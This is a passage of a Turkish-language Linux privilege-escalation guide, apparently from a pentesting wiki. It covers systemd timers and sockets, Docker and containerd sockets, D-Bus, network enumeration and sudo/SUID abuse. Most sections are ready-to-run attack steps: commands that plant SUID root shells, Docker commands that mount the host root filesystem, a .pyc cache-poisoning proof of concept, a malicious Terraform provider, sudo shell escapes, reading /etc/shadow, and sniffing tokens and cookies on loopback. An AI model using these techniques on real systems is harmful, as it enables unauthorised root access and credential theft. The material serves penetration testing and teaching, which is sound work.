**Timers**, adı `**.timer**` ile biten ve `**.service**` dosyalarını veya event'leri kontrol eden systemd unit dosyalarıdır. **Timers**, built-in calendar time events ve monotonic time events desteğine sahip oldukları ve asynchronously çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm timers'ları şu komutla enumerate edebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timers

Eğer bir timer'ı modify edebilirseniz, onun bazı mevcut systemd.unit öğelerini çalıştırmasını sağlayabilirsiniz (örneğin bir `.service` veya bir `.target`)
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğunu okuyabilirsiniz:

> Bu timer sona erdiğinde aktive edilecek unit. Argüman bir unit ismidir ve suffix'i ".timer" değildir. Belirtilmezse, bu değer timer unit ile aynı isme sahip bir service varsayılanına ayarlanır; suffix hariç. (Yukarıya bakın.) Aktive edilen unit ismi ile timer unit'in unit isminin, suffix hariç, aynı olması önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- Yazılabilir bir binary çalıştıran bir systemd unit (örneğin bir `.service`) bulmak
- Relative path çalıştıran ve systemd PATH üzerinde **yazma yetkisine** sahip olduğunuz bir systemd unit bulmak (o executable'ı taklit etmek için)

**Timers hakkında daha fazla bilgi için `man systemd.timer` okuyun.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root yetkileri gerekir ve şunu execute etmek gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Not edin, **timer** `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` içine ona bir symlink oluşturularak **aktif edilir**.

## Sockets

Unix Domain Sockets (UDS), client-server modellerinde aynı veya farklı makineler arasında **process communication** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanırlar ve `.socket` dosyaları üzerinden kurulur.

Sockets, `.socket` dosyaları kullanılarak yapılandırılabilir.

**Sockets hakkında daha fazla bilgi için `man systemd.socket` komutuna bakın.** Bu dosya içinde birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özet olarak socket için **nerede dinleme yapılacağını** belirtir (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, gelen **her bağlantı için bir service instance başlatılır** ve ona yalnızca bağlantı socket’i verilir. Eğer **false** ise, tüm dinleme socket’lerinin kendisi başlatılan service unit’e **aktarılır** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Bu değer, tek bir service unit’in tüm gelen trafiği koşulsuz olarak yönettiği datagram sockets ve FIFOs için yok sayılır. **Varsayılan false**. Performans nedenleriyle, yeni daemon’ları yalnızca `Accept=no` için uygun olacak şekilde yazmanız önerilir.
- `ExecStartPre`, `ExecStartPost`: Dinleme **sockets**/FIFOs sırasıyla **oluşturulmadan önce** veya **oluşturulduktan sonra** çalıştırılan bir ya da daha fazla command line alır. Command line içindeki ilk token mutlak bir dosya adı olmalıdır, ardından process için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFOs sırasıyla **kapatılmadan önce** veya **kapatıldıktan sonra** çalıştırılan ek **commands**.
- `Service`: Gelen **traffic** üzerinde **aktif edilecek** **service** unit adını belirtir. Bu ayar yalnızca Accept=no olan sockets için izinlidir. Varsayılan olarak socket ile aynı adı taşıyan service’tir (suffix değiştirilmiş halde). Çoğu durumda bu seçeneği kullanmak gerekli olmamalıdır.

### Writable .socket files

Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey **ekleyebilirsiniz** ve backdoor socket oluşturulmadan önce çalıştırılır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekir.**\
_Not: Sistem bu socket dosyası yapılandırmasını kullanıyor olmalıdır, aksi halde backdoor çalıştırılmaz_

### Socket activation + writable unit path (create missing service)

Bir diğer yüksek etkili misconfiguration şudur:

- `Accept=no` ve `Service=<name>.service` olan bir socket unit
- referans verilen service unit eksik
- attacker `/etc/systemd/system` içine (veya başka bir unit search path’e) yazabiliyor

Bu durumda attacker `<name>.service` oluşturabilir, ardından socket’e traffic tetikleyerek systemd’nin yeni service’i root olarak yüklemesini ve çalıştırmasını sağlayabilir.

Hızlı akış:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Yazılabilir sockets

Eğer herhangi bir **yazılabilir socket** belirlerseniz (_şimdi Unix Sockets’ten bahsediyoruz, config `.socket` dosyalarından değil_), o zaman bu socket ile **iletişim kurabilirsiniz** ve belki bir vulnerability istismar edebilirsiniz.

### Unix Sockets enumerate et
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Dikkat edin, **HTTP** istekleri için dinleyen bazı **sockets** olabilir (_burada .socket dosyalarından değil, unix sockets olarak çalışan dosyalardan bahsediyorum_). Bunu şu şekilde kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Eğer socket bir **HTTP** isteğiyle **yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **bir zafiyeti exploit edebilirsiniz**.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunur ve korunması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket’e yazma erişimine sahip olmak, privilege escalation’a yol açabilir. Bunun nasıl yapılabileceğinin ve Docker CLI mevcut değilse alternatif yöntemlerin bir dökümü aşağıdadır.

#### **Docker CLI ile Privilege Escalation**

Docker socket’e yazma erişiminiz varsa, aşağıdaki komutları kullanarak privilege escalation yapabilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host’un dosya sistemine root-level erişimle bir container çalıştırmanı sağlar.

#### **Using Docker API Directly**

Docker CLI mevcut olmadığında, Docker socket yine de Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Mevcut image listesini al.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için bir istek gönder.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container’ı başlat:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Container’a bağlantı kurmak için `socat` kullan; böylece içinde komut çalıştırabilirsin.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host’un filesystem’ine root-level erişimle container içinde doğrudan komut çalıştırabilirsin.

### Others

Eğer **docker** group içindeysen ve docker socket üzerinde yazma iznin varsa, [**privilege escalation için daha fazla yol**](interesting-groups-linux-pe/index.html#docker-group) bulabilirsin. Eğer [**docker API bir portta dinliyorsa** onu da compromise edebilirsin](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

**Container’lardan çıkmanın veya container runtimes’ı kötüye kullanarak privilege escalation yapmanın daha fazla yolunu** şurada kontrol et:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğini fark edersen, aşağıdaki sayfayı oku; **onu abuse ederek privilege escalation yapabilirsin**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğini fark edersen, aşağıdaki sayfayı oku; **onu abuse ederek privilege escalation yapabilirsin**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşime girmesini ve data paylaşmasını sağlayan gelişmiş bir **inter-Process Communication (IPC)** sistemidir. Modern Linux sistemi düşünülerek tasarlanmıştır ve farklı uygulama iletişimi biçimleri için sağlam bir framework sunar.

Sistem oldukça esnektir; süreçler arasında data alışverişini geliştiren temel IPC’yi destekler ve **gelişmiş UNIX domain sockets**’e benzer. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyon sağlar. Örneğin, Bluetooth daemon’ından gelen bir çağrı sinyali bir music player’ın sesi kısmasını tetikleyebilir; bu da user experience’i iyileştirir. Ek olarak, D-Bus uzak object sistemini destekler; uygulamalar arasında service request ve method invocation işlemlerini kolaylaştırır, geleneksel olarak karmaşık olan süreçleri sadeleştirir.

D-Bus bir **allow/deny model** ile çalışır; mesaj izinlerini (method çağrıları, signal yayını vb.) eşleşen policy kurallarının kümülatif etkisine göre yönetir. Bu policies, bus ile etkileşimleri tanımlar ve bu izinlerin kötüye kullanılması yoluyla privilege escalation mümkün olabilir.

`/etc/dbus-1/system.d/wpa_supplicant.conf` içindeki böyle bir policy örneği, root user için `fi.w1.wpa_supplicant1` üzerinde sahip olma, ona mesaj gönderme ve ondan mesaj alma izinlerini detaylandırır.

Belirli bir user veya group belirtilmeyen policies evrensel olarak uygulanır; "default" context policies ise diğer spesifik policies tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini nasıl enumerate edip exploit edeceğinizi burada öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Ağını enumerate etmek ve makinenin konumunu anlamak her zaman ilginçtir.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Giden trafik filtresi hızlı triage

Eğer host komut çalıştırabiliyor ama callbacks başarısız oluyorsa, DNS, transport, proxy ve route filtering’i hızlıca ayır:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Açık portlar

Makineye erişmeden önce etkileşim kuramadığınız ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Dinleyicileri bind hedefine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde açık.
- `127.0.0.1` / `::1`: yalnızca local-only (iyi tunnel/forward adayları).
- Belirli internal IP’ler (ör. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca internal segmentlerden erişilebilir.

### Local-only service triage workflow

Bir host’u compromise ettiğinizde, `127.0.0.1` üzerinde bind edilmiş servisler çoğu zaman shell’inizden ilk kez erişilebilir hale gelir. Hızlı bir local workflow şöyledir:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS bir ağ tarayıcısı olarak (yalnızca ağ modu)

Yerel PE kontrollerine ek olarak, linPEAS odaklı bir ağ tarayıcısı olarak çalışabilir. `$PATH` içindeki mevcut binary’leri kullanır (genellikle `fping`, `ping`, `nc`, `ncat`) ve herhangi bir tool kurmaz.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS saf bir ağ tarayıcısı gibi davranır (geri kalan privilege-escalation kontrollerini atlar).

### Sniffing

Trafiği sniff edip edemediğini kontrol et. Eğer edebiliyorsan, bazı credentials ele geçirebilirsin.
```
timeout 1 tcpdump
```
Hızlı pratik kontroller:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation sırasında özellikle değerlidir çünkü birçok yalnızca dahili hizmet token/cookie/credentials bilgilerini burada açığa çıkarır:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Şimdi yakala, sonra ayrıştır:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Kullanıcılar

### Generic Enumeration

**Kim** olduğunuzu, hangi **privileges**'lara sahip olduğunuzu, sistemde hangi **users**'ların bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root privileges**'a sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıkları yükseltmesine izin veren bir bug'dan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Bunu **`systemd-run -t /bin/bash`** kullanarak **sömür**.

### Groups

Root ayrıcalıkları verebilecek bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Mümkünse clipboard içinde ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın herhangi bir parolasını **biliyorsan** aynı parolayı kullanarak **her kullanıcıya giriş yapmayı** dene.

### Su Brute

Çok fazla gürültü çıkarmayı umursamıyorsan ve bilgisayarda `su` ve `timeout` binary'leri varsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıya brute-force yapmayı deneyebilirsin.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) de `-a` parametresiyle kullanıcılar üzerinde brute-force yapmayı dener.

## Yazılabilir PATH abuse'ları

### $PATH

Eğer $PATH içindeki bir klasöre **yazabildiğini** bulursan, **yazılabilir klasörün içine**, başka bir kullanıcı tarafından (tercihen root) çalıştırılacak ve $PATH içinde senin yazılabilir klasöründen **önce bulunan bir klasörden yüklenmeyen** bir komut adıyla bir backdoor oluşturarak yetkileri yükseltebilirsin.

### SUDO and SUID

sudo kullanarak bazı komutları çalıştırmana izin veriliyor olabilir ya da bunlarda suid biti olabilir. Şununla kontrol et:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar, dosyaları okumanıza ve/veya yazmanıza, hatta bir komut çalıştırmanıza izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte `demo` kullanıcısı `vim` komutunu `root` olarak çalıştırabilir; artık root dizinine bir ssh key ekleyerek veya `sh` çağırarak shell almak çok kolaydır.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, bir şeyi yürütürken kullanıcının bir **environment variable** ayarlamasına olanak tanır:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer** temel alınarak, betik root olarak çalıştırılırken keyfi bir python library yüklemek için **PYTHONPATH hijacking** saldırısına karşı **vulnerable** idi:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

Eğer bir **sudo-allowed Python script** bir modülü import ediyorsa ve bu modülün package dizininde **yazılabilir bir `__pycache__`** varsa, cache edilmiş `.pyc` dosyasını değiştirebilir ve bir sonraki import’ta code execution elde ederek privileged user olarak çalıştırabilirsiniz.

- Neden çalışır:
- CPython bytecode cache’lerini `__pycache__/module.cpython-<ver>.pyc` içinde saklar.
- Interpreter, **header**’ı (magic + source’a bağlı timestamp/hash metadata) doğrular, ardından bu header’dan sonra saklanan marshaled code object’i çalıştırır.
- Dizin yazılabilir olduğu için cached dosyayı **silip yeniden oluşturabiliyorsanız**, root-owned ama non-writable bir `.pyc` yine de replace edilebilir.
- Tipik yol:
- `sudo -l` bir Python script’i veya root olarak çalıştırabileceğiniz bir wrapper gösterir.
- Bu script `/opt/app/`, `/usr/local/lib/...` gibi yerel bir modülü import eder.
- Imported module’ün `__pycache__` dizini sizin user’ınız tarafından ya da herkes tarafından yazılabilirdir.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Eğer privileged script’i inceleyebiliyorsan, imported modules ve onların cache path’ini belirle:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Kötüye kullanım akışı:

1. Python’un meşru önbellek dosyasını oluşturması için, sudo ile çalışmasına izin verilen scripti bir kez çalıştırın; eğer henüz yoksa.
2. Meşru `.pyc` dosyasının ilk 16 byte’ını okuyun ve bunları zehirlenmiş dosyada yeniden kullanın.
3. Bir payload code object derleyin, `marshal.dumps(...)` ile serileştirin, orijinal cache dosyasını silin ve orijinal header ile birlikte kötü amaçlı bytecode’unuzu içerecek şekilde yeniden oluşturun.
4. sudo ile çalışmasına izin verilen scripti tekrar çalıştırın; böylece import, payload’unuzu root olarak çalıştırır.

Önemli notlar:

- Orijinal header’ı yeniden kullanmak kritiktir; çünkü Python cache metadata’sını source file ile karşılaştırır, bytecode gövdesinin gerçekten source ile eşleşip eşleşmediğine değil.
- Bu, özellikle source file root-owned olup yazılamazken, içindeki `__pycache__` directory yazılabilir olduğunda çok kullanışlıdır.
- Privileged process `PYTHONDONTWRITEBYTECODE=1` kullanıyorsa, safe permissions olan bir konumdan import ediyorsa veya import path içindeki her directory için write access’i kaldırıyorsa attack başarısız olur.

Minimal proof-of-concept şekli:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Ayrıcalıklı Python import path’inde, `__pycache__` dahil, düşük ayrıcalıklı kullanıcılar tarafından yazılabilir hiçbir dizin olmadığından emin olun.
- Ayrıcalıklı çalıştırmalar için `PYTHONDONTWRITEBYTECODE=1` kullanmayı ve beklenmeyen yazılabilir `__pycache__` dizinleri için periyodik kontroller yapmayı düşünün.
- Yazılabilir yerel Python modüllerini ve yazılabilir cache dizinlerini, root tarafından çalıştırılan yazılabilir shell script’ler veya shared libraries ile aynı şekilde ele alın.

### BASH_ENV preserved via sudo env_keep → root shell

Eğer sudoers `BASH_ENV`’i koruyorsa (örn. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir command’i çağırırken Bash’in non-interactive startup davranışını kullanarak root olarak arbitrary code çalıştırabilirsiniz.

- Neden çalışır: Non-interactive shell’ler için Bash `$BASH_ENV`’i değerlendirir ve target script’i çalıştırmadan önce o file’ı source eder. Birçok sudo rule, bir script veya shell wrapper çalıştırmaya izin verir. Eğer `BASH_ENV` sudo tarafından korunuyorsa, file’ınız root privileges ile source edilir.

- Requirements:
- Çalıştırabileceğiniz bir sudo rule ( `/bin/bash`’i non-interactive olarak invoke eden herhangi bir target veya herhangi bir bash script).
- `env_keep` içinde `BASH_ENV` bulunması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` içinden `BASH_ENV` (ve `ENV`) kaldırın, `env_reset` kullanmayı tercih edin.
- sudo ile izin verilen komutlar için shell wrapper’lardan kaçının; minimal binaries kullanın.
- Korunmuş env vars kullanıldığında sudo I/O logging ve alerting kullanmayı değerlendirin.

### Korunmuş HOME ile sudo üzerinden Terraform (!env_reset)

Eğer sudo environment’ı olduğu gibi bırakıyorsa (`!env_reset`) ve `terraform apply`e izin veriyorsa, `$HOME` çağıran kullanıcı olarak kalır. Bu nedenle Terraform, root olarak **$HOME/.terraformrc** dosyasını yükler ve `provider_installation.dev_overrides` ayarını dikkate alır.

- Gerekli provider’ı yazılabilir bir dizine yönlendirin ve provider adıyla adlandırılmış kötü amaçlı bir plugin bırakın (ör. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform, Go plugin handshake sırasında başarısız olur ama ölmeden önce payload’u root olarak çalıştırır ve geride bir SUID shell bırakır.

### TF_VAR overrides + symlink validation bypass

Terraform variables, `TF_VAR_<name>` environment variables aracılığıyla sağlanabilir; sudo environment’ı koruduğunda bunlar da kalır. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf validations symlinks ile bypass edilebilir:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink’i çözer ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink’leri önceden oluşturarak ayrıcalıklı path’lere **write** etmek için de kullanılabilir (ör. sağlayıcının destination path’ini `/etc/cron.d/` içine işaret ettirmek).

### requiretty / !requiretty

Bazı eski dağıtımlarda, sudo yalnızca etkileşimli bir TTY’den çalışacak şekilde zorlayan `requiretty` ile yapılandırılabilir. Eğer `!requiretty` ayarlanmışsa (veya seçenek yoksa), sudo reverse shells, cron jobs veya scripts gibi etkileşimsiz bağlamlardan çalıştırılabilir.
```bash
Defaults !requiretty
```
Bu, tek başına doğrudan bir zafiyet değildir; ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabildiği durumları genişletir.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Eğer `sudo -l` içinde `env_keep+=PATH` veya saldırgan tarafından yazılabilir girdiler içeren bir `secure_path` görünüyorsa (ör. `/home/<user>/bin`), sudo ile izin verilen hedef içindeki herhangi bir relative komut gölgelenebilir.

- Gereksinimler: absolute path kullanmadan komut çağıran bir script/binary çalıştıran bir sudo kuralı (çoğu zaman `NOPASSWD`) (`free`, `df`, `ps`, vb.) ve ilk sırada aranan yazılabilir bir PATH girdisi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
Diğer dosyaları okumak veya **symlinks** kullanmak için **Jump**. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** (\*) kullanılıyorsa, bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu olmadan Sudo command/SUID binary

Eğer **sudo yetkisi** tek bir komuta **yol belirtilmeden** verilirse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bundan yararlanabilirsiniz
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik ayrıca bir **suid** binary başka bir komutu ona giden yolu belirtmeden **çalıştırıyorsa** da kullanılabilir (**garip bir SUID binary** içeriğini her zaman **strings** ile kontrol edin).

